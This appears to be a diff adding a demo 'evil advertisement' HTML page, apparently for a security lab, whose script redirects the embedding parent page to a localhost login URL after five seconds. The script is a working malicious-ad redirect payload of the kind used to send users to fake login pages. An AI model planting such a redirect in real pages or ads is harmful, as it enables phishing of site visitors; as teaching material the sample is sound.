@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evil ad</title>
+</head>
+<body>
+  <h1><b>Evil</b> advertisement</h1>
+  <p>
+    You are going to be redirected in 5 seconds !
+  </p>
+
+  <script>
+    if (window.parent) 
+    {
+        setTimeout(
+            function() {
+                window.parent.location.replace('http://localhost:3005/login')
+            }, 5000);
+    }
+  </script>
+
+</body>
+</html>
